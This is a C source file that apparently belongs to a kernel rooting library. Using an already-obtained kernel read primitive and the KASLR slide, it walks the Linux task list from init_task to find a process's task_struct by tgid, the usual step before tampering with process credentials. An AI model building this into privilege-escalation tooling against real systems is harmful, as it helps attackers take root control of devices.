/* lib/root/taskscan.c -- see taskscan.h. */
#include <string.h>

#include "taskscan.h"

uint64_t lib_find_task_by_tgid(
    const struct krw *rw, const struct kslide *slide,
    uint64_t init_task_tasks_image, uint32_t want_tgid,
    struct lib_task_match *out) {
  kdirect_t head = kd_image(init_task_tasks_image);
  uint64_t canonical_head = lib_canon_addr(slide, init_task_tasks_image);
  uint64_t entry = krw_read64(rw, head);
  int iters = 0;
  uint64_t last_entry = 0;

  if (out) {
    memset(out, 0, sizeof(*out));
  }

  for (int i = 0; i < 4096; i++) {
    iters = i + 1;
    last_entry = entry;
    if (entry == canonical_head || entry == kd_val(head)) {
      break;
    }
    if (!lib_is_direct_ptr(entry)) {
      break;
    }

    kdirect_t task = k_direct_raw(entry - TASK_TASKS_OFF);
    uint32_t pid = krw_read32(rw, kd_add(task, TASK_PID_OFF));
    uint32_t tgid = krw_read32(rw, kd_add(task, TASK_TGID_OFF));
    char comm[TASK_COMM_LEN + 1];
    memset(comm, 0, sizeof(comm));
    krw_read(rw, kd_add(task, TASK_COMM_OFF), comm, TASK_COMM_LEN);

    if (tgid == want_tgid || pid == want_tgid) {
      if (out) {
        out->pid = pid;
        out->tgid = tgid;
        memcpy(out->comm, comm, sizeof(out->comm));
        out->iters = iters;
        out->last_entry = last_entry;
      }
      return kd_val(task);
    }

    entry = krw_read64(rw, kd_add(task, TASK_TASKS_OFF));
  }

  if (out) {
    out->iters = iters;
    out->last_entry = last_entry;
  }
  return 0;
}
